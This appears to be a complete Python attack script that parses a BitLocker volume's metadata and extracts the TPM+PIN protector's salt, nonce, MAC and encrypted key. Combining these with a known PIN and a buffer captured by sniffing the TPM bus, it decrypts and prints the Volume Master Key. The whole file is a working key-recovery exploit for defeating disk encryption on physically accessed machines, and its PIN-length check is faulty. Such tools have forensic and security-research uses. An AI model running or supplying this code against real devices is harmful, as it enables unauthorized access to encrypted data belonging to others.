import struct
import uuid
import hashlib
import argparse
from Crypto.Cipher import AES

# Global variables required to decrypt the key.
SALT = ""
NONCE = ""
CIPHER = ""
MAC = ""

# Position within the TPM buffer.
TPMB_NONCE_START = 16
TPMB_NONCE_END = 40
TPMB_CIPHER_START = 72
TPMB_CIPHER_END = 160
TPMB_MAC_START = 40
TPMB_MAC_END = 72
BITLOCKER_HEADER_LEN = 24

# Bitlocker header formats and size.
boot_sector_hdr_format = '3s8s60s11s8s86s8s8s8s'
boot_sector_hdr_size = 200
fve_block_hdr_format = '8s2s2s20s8s8s8s8s'
fve_block_hdr_size = 64
fve_hdr_format = '4s4s4s4s16s4s4s8s'
fve_hdr_size = 48
fve_entry_hdr_format = '2s2s2s2s'
fve_entry_hdr_size = 8
fve_vmk_hdr_format = '16s10s2s'
fve_vmk_hdr_size = 28
vmk_property_hdr_format = '2s2s2s2s'
vmk_property_hdr_size = 8

# FVE entry types.
entry_type_dict = {
    0x0000: 'None',
    0x0002: 'Volume Master Key (VMK)',
    0x0003: 'Full Volume Encryption Key (FVEK)',
    0x0004: 'Validation',
    0x0006: 'Startup Key',
    0x0007: 'Drive Label',
    0x000b: 'Auto Unlock',
    0x000f: 'Volume Header Block',
    0x0011: 'Unknown'
}

# Type of VMK protections.
protection_dict = {
    0x0000: 'VMK protected with clear key',
    0x0100: 'VMK protected with TPM',
    0x0200: 'VMK protected with startup key',
    0x0500: 'VMK protected with TPM and PIN',
    0x0800: 'VMK protected with recovery password',
    0x2000: 'VMK protected with password'
}

# Type of VMK properties.
key_type_dict = {
    0x0000: 'Erased',
    0x0001: 'Key',
    0x0002: 'Unicode string',
    0x0003: 'Stretch Key',
    0x0004: 'Use Key',
    0x0005: 'AES-CCM encrypted key',
    0x0006: 'TPM encoded key',
    0x0007: 'Validation',
    0x0008: 'Volume master key',
    0x0009: 'External key',
    0x000a: 'Update',
    0x000b: 'Error',
    0x000f: 'Offset and size',
    0x0010: 'Unknown',
    0x0011: 'Unknown',
    0x0012: 'Unknown',
    0x0013: 'Unknown'
}

# Stretch the user PIN to get the first decryption key.
def stretch_pin(user_pin, salt):

    # Initialize structure elements with default values.
    last_hash = bytes.fromhex("0000000000000000000000000000000000000000000000000000000000000000")
    salt = bytes.fromhex(salt)
    iterations = 0x100000

    # Encode the PIN in UTF-16 (little endian) and hash it twice with SHA256 to get the initial hash.
    pin = user_pin.encode("utf-16-le")
    initial_hash = hashlib.sha256(pin).digest()
    initial_hash = hashlib.sha256(initial_hash).digest()
    
    # Iterate SHA256 on the structure {LAST_HASH | INITIAL_HASH | SALT | COUNTER} to get the stretched key.
    for x in range(0, iterations):
        struct = last_hash + initial_hash + salt + x.to_bytes(8, byteorder='little')
        last_hash = hashlib.sha256(struct).digest()

    return last_hash.hex()

# Decrypt an AES-CCM entry and verify the MAC if provided.
def decrypt_entry(nonce, cipher, key, mac=None):

    # Attempt to decrypt the key using the provided values.
    ciphertext = AES.new(bytes.fromhex(key), AES.MODE_CCM, bytes.fromhex(nonce))
    plaintext = ciphertext.decrypt(bytes.fromhex(cipher))
    
    # Check the integrity if MAC is provided.
    if mac != None:
        try:
            ciphertext.verify(bytes.fromhex(mac))
            print(f"[+] Message Authentication Code is valid, decryption succeeded!")
        except ValueError:
            print("[-] Key is incorrect or decryption failed!")

    # Return decrypted data as a hey string.
    return plaintext.hex()

# Parse the Bitlocker nested header and properties to get the cryptographic material associated with the TPM+PIN protector. 
def read_bitlocker_structure(file_path):

    global NONCE
    global SALT
    global CIPHER
    global MAC

    # Open the Bitlocker partition.
    with open(file_path, 'rb') as f:
        
        # Parse the boot sector header to get the signature and FVE offsets.
        data = f.read(boot_sector_hdr_size)
        unpacked_data = struct.unpack(boot_sector_hdr_format, data)
        
        boot_sector_header = {
            'boot_entry_point': unpacked_data[0],
            'file_system_signature': unpacked_data[1],
            'useless1': unpacked_data[2],
            'vol_label': unpacked_data[3],
            'fs_signature': unpacked_data[4],
            'useless2': unpacked_data[5],
            'fve_metadata_block_1_offset': unpacked_data[6],
            'fve_metadata_block_2_offset': unpacked_data[7],
            'fve_metadata_block_3_offset': unpacked_data[8],
        }
        
        # Check the volume signature to ensure it's a Bitlocker volume.
        if boot_sector_header['file_system_signature'] == b"-FVE-FS-":
            print(f"[+] The volume signature is correct.")
        else:
            print(f"[-] Invalid Bitlocker signature, exiting ...")
            return
        
        # Get the FVE block offset, only consider the first offset and ignore the two others.
        fve_block_offset = int.from_bytes(boot_sector_header['fve_metadata_block_1_offset'], byteorder='little')
        
        print(f"[+] Moving to the FVE block header ...")

        # Move to FVE block offset and parse the FVE block header.
        f.seek(fve_block_offset)
        data = f.read(fve_block_hdr_size)
        unpacked_data = struct.unpack(fve_block_hdr_format, data)
        
        fve_block_header = {
            'signature': unpacked_data[0],
            'useless1': unpacked_data[1],
            'version': unpacked_data[2],
            'useless2': unpacked_data[3],
            'fve_metadata_block_1_offset': unpacked_data[4],
            'fve_metadata_block_2_offset': unpacked_data[5],
            'fve_metadata_block_3_offset': unpacked_data[6],
            'volume_header_offset': unpacked_data[7],
        }
        
        # Check the FVE block signature to ensure it's a FVE block entry.
        if fve_block_header['signature'] == b"-FVE-FS-":
            print(f"[+] The FVE block signature is correct.")
        else:
            print(f"[-] Invalid FVE block header signature, exiting ...")
            return
        
        # Skip the FVE block header to parse the first FVE header which is directly after.
        f.seek(fve_block_offset + fve_block_hdr_size)
        data = f.read(fve_hdr_size)
        unpacked_data = struct.unpack(fve_hdr_format, data)
        
        fve_header = {
            'metadata_size': unpacked_data[0],
            'version': unpacked_data[1],
            'header_size': unpacked_data[2],
            'useless1': unpacked_data[3],
            'volume_guid': unpacked_data[4],
            'useless2': unpacked_data[5],
            'encryption': unpacked_data[6],
            'creation_time': unpacked_data[7],
        }

        # Get the overall FVE section size.
        fve_size = int.from_bytes(fve_header['metadata_size'], byteorder='little')

        # Skip the FVE header and walk through the FVE entries.
        fve_entry_ptr = 0
        while fve_entry_ptr < fve_size - fve_hdr_size:
        
            # Move to the next FVE entry and parse the FVE entry header.
            f.seek(fve_block_offset + fve_block_hdr_size + fve_hdr_size + fve_entry_ptr)
            data = f.read(fve_entry_hdr_size)
            unpacked_data = struct.unpack(fve_entry_hdr_format, data)
              
            fve_entry = {
                'size': unpacked_data[0],
                'type': unpacked_data[1],
                'value': unpacked_data[2],
                'version': unpacked_data[3],
            }
                
            # Get the entry size and type.
            entry_size = int.from_bytes(fve_entry['size'], byteorder='little')
            entry_type = int.from_bytes(fve_entry['type'], byteorder='little')
              
            # Get the entry content.
            data = f.read(entry_size)
                
            # Filter VMK entries for additional processing.  
            if entry_type == 0x0002:
                
                # Parse the VMK entry header to check the protection type.
                unpacked_data = struct.unpack(fve_vmk_hdr_format, data[:fve_vmk_hdr_size])
                vmk_entry = {
                    'key_identifier': unpacked_data[0],
                    'useless1': unpacked_data[1],
                    'protection': unpacked_data[2],
                }
                
                # Further process protection type and key identifier.
                protection_type = int.from_bytes(vmk_entry['protection'], byteorder='little')
                key_identifier = uuid.UUID(bytes_le=vmk_entry['key_identifier'])
                
                # Filter VMK entries related to TPM+PIN protection for additional processing.
                if protection_type == 0x0500:
                                         
                    print("[+] A VMK entry related to a TPM+PIN protector was found.")
                    
                    # Parsing the VMK entry properties.                                    
                    property_ptr = 0
                    while property_ptr < entry_size - fve_entry_hdr_size - fve_vmk_hdr_size:
                                        
                        unpacked_data = struct.unpack(vmk_property_hdr_format, data[fve_vmk_hdr_size+property_ptr:fve_vmk_hdr_size+property_ptr+vmk_property_hdr_size])
                        vmk_property = {
                            'size': unpacked_data[0],
                            'type': unpacked_data[1],
                            'value': unpacked_data[2],
                            'version': unpacked_data[3],
                        }

                        property_size = int.from_bytes(vmk_property['size'], byteorder='little')
                        property_value = int.from_bytes(vmk_property['value'], byteorder='little')
                                        
                        # Additional processing if stretch key entry is found.
                        if property_value == 0x0003:

                            print("[+] A stretch key property was identified, extracting the salt ...")

                            # Get the salt.
                            salt_offset = fve_vmk_hdr_size + vmk_property_hdr_size + 4
                            salt_size = 16
                            SALT = data[salt_offset:salt_offset+salt_size].hex()
                            
                            print(f"[+] The stretch key salt is : {SALT}")
                                        
                        # Additional processing if an encrypted key is found.
                        if property_value == 0x0005:
                                      
                            print("[+] An encrypted key property was identified, extracting the ciphertext and nonce ...")          
                            
                            # Get the MAC and encrypted key.
                            nonce_offset = fve_vmk_hdr_size+property_ptr+8
                            nonce_size = 12
                            mac_offset = fve_vmk_hdr_size+property_ptr+20
                            mac_size = 16
                            cipher_offset = fve_vmk_hdr_size+property_ptr+36
                            cipher_size = 44
                            
                            NONCE = data[nonce_offset:nonce_offset+nonce_size].hex()
                            MAC = data[mac_offset:mac_offset+mac_size].hex()
                            CIPHER = data[cipher_offset:cipher_offset+cipher_size].hex()
                            
                            print(f"[+] The VMK nonce is : {NONCE}")
                            print(f"[+] The VMK MAC is : {MAC}")
                            print(f"[+] The VMK ciphertext is : {CIPHER}")

                        # Move to the next property.                                        
                        property_ptr += property_size
                
            #Move to the next FVE entry.
            fve_entry_ptr += entry_size

## Parse arguments to get bitlocker volume, user pin and sniffed data.
parser = argparse.ArgumentParser(prog='tpm_sniffing_pin', usage='%(prog)s --dev [DEV] --pin [PIN] --tpm [TPM_BUFFER]')
parser.add_argument('--dev', required=True, help='Bitlocker encrypted partition path')
parser.add_argument('--pin', required=True, help='Bitlocker PIN code (6-20 digits)')
parser.add_argument('--tpm', required=True, help='Buffer (160 hex-char) retrieved through TPM sniffing starting with "5000000005000000"')
args = parser.parse_args()

# Checking provided parameters.
if len(args.pin) < 6 and len(args.pin) > 20:
        print("[-] Invalid PIN length ...")
        exit()

# Parse the bitlocker volume headers to get the required cryptographic material.
print("[+] Opening the Bitlocker volume ...")
read_bitlocker_structure(args.dev)

# Checking that all the required information were found within the headers.
if SALT != "" and NONCE != "" and CIPHER != "":

    print("[+] All the required data were found in the Bitlocker header.")

    # Streching the user PIN.
    print("[+] Streching the user PIN ...")
    streched_key = stretch_pin(args.pin, SALT)
    print(f"[+] The streched key is : {streched_key}")

    # Decrypting the intermediate key from the TPM transmitted data.
    print("[+] Decrypting the data provided by the TPM ...")
    intermediate_key = decrypt_entry(args.tpm[TPMB_NONCE_START:TPMB_NONCE_END], args.tpm[TPMB_CIPHER_START:TPMB_CIPHER_END], streched_key, args.tpm[TPMB_MAC_START:TPMB_MAC_END])
    print(f"[+] Intermediate key is : {intermediate_key}")

    # Decrypting the VMK using the intermediate key.
    print("[+] Decrypting the VMK using the intermediate key ...")
    vmk = decrypt_entry(NONCE, CIPHER, intermediate_key[BITLOCKER_HEADER_LEN:], MAC)
    print(f"[+] VMK found: {vmk}")
    
else:

    # Parsing failed, stopping execution.
    print("[-] Bitlocker volume parsing failed, exiting ...")
